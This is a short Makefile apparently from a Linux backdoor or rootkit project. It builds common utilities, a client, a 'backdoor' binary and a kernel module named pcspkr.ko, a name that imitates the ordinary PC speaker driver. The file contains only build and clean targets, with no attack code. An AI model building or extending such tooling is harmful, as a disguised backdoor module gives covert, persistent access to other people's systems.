## ENVIRONMENT VARS

export COMMONDIR=$(PWD)/src/common
export INCLUDEDIR=$(PWD)/include
export BINDIR=$(PWD)/bin

## DEFAULT

all: utils cli bd mod

## BUILD UTILITIES

utils:
	cd src/common && $(MAKE)

## BUILD CLIENT

cli:
	cd src/client && $(MAKE)

## BUILD BACKDOOR

bd:
	cd src/backdoor && $(MAKE)

## BUILD MODULE

mod:
	cd src/module && $(MAKE)

## BUILD TAGS

tags:
	ctags --recurse --sort=yes --extra=+fq

## REMOVE OBJECT FILES AND BINARIES

clean:
	cd src/backdoor && rm *.o -f
	cd src/client && rm *.o -f
	cd src/common && rm *.o -f
	cd src/module && $(MAKE) clean
	cd bin && rm bd -f && rm cli -f && rm pcspkr.ko -f
